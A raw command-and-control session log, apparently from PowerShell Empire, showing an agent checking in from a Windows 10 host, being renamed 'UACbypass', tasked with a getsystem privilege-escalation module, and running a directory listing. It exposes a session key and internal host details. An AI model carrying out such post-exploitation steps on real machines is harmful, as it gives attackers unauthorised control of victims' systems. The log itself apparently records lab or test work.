
2019-05-16 19:55:57 : 

[*] Agent info:
  nonce           	7445767061672652
  jitter          	0.0
  servers         	None
  internal_ip     	192.168.226.1 fe80::9442:f8f3:5b23:22d1 192.168.153.1
                                fe80::78a5:53be:b208:43ea 192.168.1.5 fe80::a41d:e79e:d3d7:49a8
                                169.254.182.30 fe80::4d72:dc5a:5819:b61e
  working_hours   	
  session_key     	h:}c3FNTSI75$M=4<ul1RX+Yp?/\2^Z8
  children        	None
  checkin_time    	2019-05-16 19:55:56
  hostname        	LAMEDIM-LT
  id              	2
  delay           	5
  username        	LAMEDIM-LT\User
  kill_date       	
  parent          	None
  process_name    	powershell
  listener        	http
  process_id      	9996
  profile         	/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT
                                6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
  os_details      	Microsoft Windows 10 Home
  lost_limit      	60
  taskings        	None
  name            	P8A21MH4
  language        	powershell
  external_ip     	192.168.153.1
  session_id      	P8A21MH4
  lastseen_time   	2019-05-16 19:55:56
  language_version	5
  high_integrity  	1


[+] Agent P8A21MH4 now active:


2019-05-16 19:56:59 : 
[*] Agent renamed from P8A21MH4 to UACbypass

2019-05-16 19:57:42 : 
Tasked agent to run module powershell/privesc/getsystem

2019-05-16 19:57:43 : 
LAMEDIM-LT\User

2019-05-16 19:59:11 : 
Tasked agent to run command dir

2019-05-16 19:59:22 : 
Mode   Owner                       LastWriteTime         length    Name                                                
----   -----                       -------------         ------    ----                                                
d----- NT SERVICE\TrustedInstaller 9/15/2018 12:08:54 PM           0409                                                
d----- NT SERVICE\TrustedInstaller 9/15/2018 10:34:00 AM           AdvancedInstallers                                  
d----- NT AUTHORITY\SYSTEM         11/6/2018 10:40:36 AM           af-ZA                                               
d----- NT AUTHORITY\SYSTEM         9/15/2018 10:34:00 AM           am-et                                               
d----- NT AUTHORITY\SYSTEM         9/15/2018 10:33:50 AM           AppLocker                                           
d----- NT SERVICE\TrustedInstaller 5/15/2019 7:01:23 AM            appraiser                                           
d----- NT SERVICE\TrustedInstaller 5/15/2019 6:58:05 AM            ar-SA                                               
d----- NT AUTHORITY\SYSTEM         11/6/2018 10:40:36 AM           as-IN                                               
d----- NT AUTHORITY\SYSTEM         4/10/2019 5:37:10 PM            az-Latn-AZ                                          
d----- NT AUTHORITY\SYSTEM         11/6/2018 10:40:36 AM           be-BY                                               
d----- NT SERVICE\TrustedInstaller 5/15/2019 6:58:05 AM            bg-BG                                               
d----- NT AUTHORITY\SYSTEM         11/6/2018 10:40:36 AM           bn-BD                                               
d----- NT AUTHORITY\SYSTEM         11/6/2018 10:40:36 AM           bn-IN                                               
d----- NT SERVICE\TrustedInstaller 5/15/2019 7:01:23 AM            Boot                                                
d----- NT AUTHORITY\SYSTEM         4/10/2019 5:37:10 PM            bs-Latn-BA                                          
d----- NT SERVICE\TrustedInstaller 9/15/2018 10:34:00 AM           Bthprops                                            
d----- NT AUTHORITY\SYSTEM         11/6/2018 10:40:36 AM           ca-ES                                               
d----- NT AUTHORITY\SYSTEM         4/10/2019 5:37:10 PM            ca-ES-valencia                                      
d----- NT AUTHORITY\SYSTEM         9/15/2018 10:33:50 AM           CatRoot                                             
d----- NT AUTHORITY\SYSTEM         5/16/2019 11:18:07 AM           catroot2                                            
d----- NT AUTHORITY\SYSTEM         4/10/2019 5:37:10 PM            chr-CHER-US                                         
d----- NT SERVICE\TrustedInstaller 9/15/2018 10:33:50 AM           CodeIntegrity                                       
d----- NT SERVICE\TrustedInstaller 9/15/2018 12:08:54 PM           com                                                 
d----- NT AUTHORITY\SYSTEM         5/16/2019 11:26:06 AM           config                                              
d---s- NT SERVICE\TrustedInstaller 9/15/2018 10:33:50 AM           Configuration                                       
d----- NT SERVICE\TrustedInstaller 5/15/2019 6:58:05 AM            cs-CZ                                               
d----- NT AUTHORITY\SYSTEM         11/6/2018 10:40:36 AM           cy-GB                                               
d----- NT SERVICE\TrustedInstaller 5/15/2019 6:58:05 AM            da-DK                                               
d----- NT AUTHORITY\SYSTEM         5/14/2019 8:09:36 PM            DAX2                                                
d----- NT SERVICE\TrustedInstaller 9/15/2018 10:34:00 AM           DDFs                                                
d----- NT SERVICE\TrustedInstaller 5/15/2019 6:58:05 AM            de-DE                                               
d---s- NT SERVICE\TrustedInstaller 5/15/2019 7:01:23 AM            DiagSvcs                                            
d----- NT SERVICE\TrustedInstaller 5/15/2019 7:01:23 AM            Dism                                                
d----- NT SERVICE\TrustedInstaller 9/15/2018 9:09:29 AM            downlevel                                           
d----- NT SERVICE\TrustedInstaller 5/15/2019 10:32:12 AM           drivers                                             
d----- NT AUTHORITY\SYSTEM         9/15/2018 10:33:50 AM           DriverState                                         
